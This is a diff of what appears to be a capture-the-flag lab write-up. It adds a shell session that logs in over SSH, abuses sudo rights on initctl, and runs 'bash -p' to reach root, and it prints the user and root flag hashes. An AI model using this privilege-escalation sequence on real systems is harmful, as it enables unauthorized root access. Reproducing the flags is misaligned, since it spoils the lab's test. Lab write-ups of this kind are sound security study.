@@ -121,7 +121,20 @@ script
 end script
 
 Reference at : https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9
-
-sudo /sbin/inictl start test
-/bin/bash -p
-Root flag : d44519713b889d5e1f9e536d0c6df2fc
+└─# ssh katie@10.10.10.229
+Password: 
+-bash-4.3$ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+-bash-4.3$ ls
+log  user.txt
+-bash-4.3$ cat user.txt
+e89d27fe195e9114ffa72ba8913a6130
+-bash-4.3$ sudo /sbin/initctl start test2
+test2 start/running, process 68755
+-bash-4.3$ /bin/bash -p
+bash-4.3# id
+uid=20156(katie) gid=20157(katie) euid=0(root) egid=0(root) groups=0(root),20157(katie),20158(developers)
+bash-4.3# whoami
+root
+bash-4.3# cat /root/root.txt
+d44519713b889d5e1f9e536d0c6df2fc
